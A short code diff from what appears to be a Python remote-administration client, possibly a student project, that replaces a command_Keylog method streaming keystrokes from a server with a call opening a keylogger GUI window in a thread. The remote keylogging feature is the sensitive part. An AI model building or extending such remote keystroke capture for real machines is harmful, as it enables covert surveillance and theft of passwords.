@@ -5,6 +5,7 @@ import socket
 import commander
 import threading
 import registerGUI
+import keylogGUI
 from time import sleep
 class Client(object):
     def __init__(self):
@@ -147,16 +148,10 @@ class Client(object):
         regEdit.loadReg()
     
     def command_Keylog(self):
-        cmd = "KEYLOG"
-        self.sendToServer(cmd)
-        print("Keylogging started.")
-        with self.connection as conn:
-            while True:
-                data = conn.recv(1024)
-                if not data:
-                    break
-                print(data.decode(), end='')
-                sleep(20)
+        keyloggerGUI = keylogGUI.KeyloggerWindow(Toplevel(),self.IP,self.port_no)
+        keylogThread = threading.Thread(target=keyloggerGUI.loadKeyLog())
+        keylogThread.start()
+       
 
     #Ham gui toi server
     def sendToServer(self,Str):
